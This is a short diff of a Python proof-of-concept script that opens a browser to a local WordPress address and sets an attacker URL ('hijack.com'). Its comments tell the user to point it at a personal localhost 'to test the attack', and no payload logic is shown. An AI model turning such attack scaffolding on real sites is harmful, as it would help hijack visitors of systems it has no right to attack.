@@ -2,10 +2,13 @@ import subprocess
 import webbrowser
 
 new = 2
+
+# Change the url to the personal locahost to test the attack : "https://127.0.0.1/wp/"
+
 url="https://10.211.55.7/"
 webbrowser.open(url,new=new)
 
-# Change the localhost to the personal locahost to test the attack
+# Change the localhost to the personal locahost to test the attack : "https://127.0.0.1/wp/"
 
 localhost = "https://10.211.55.7/"
 attackurl = "https://hijack.com"
